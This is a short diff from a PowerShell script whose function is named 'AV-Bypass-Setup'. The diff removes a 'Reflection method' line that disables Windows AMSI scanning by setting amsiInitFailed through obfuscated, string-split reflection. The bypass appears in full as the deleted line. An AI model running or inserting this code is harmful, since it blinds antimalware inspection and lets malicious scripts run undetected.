@@ -72,7 +72,7 @@ function AV-Bypass-Setup
 				
 				Write-host " "
 				Write-host "Running Reflection method"
-				[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').GetField('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true)
+				
 			}
 			2 {
                 		
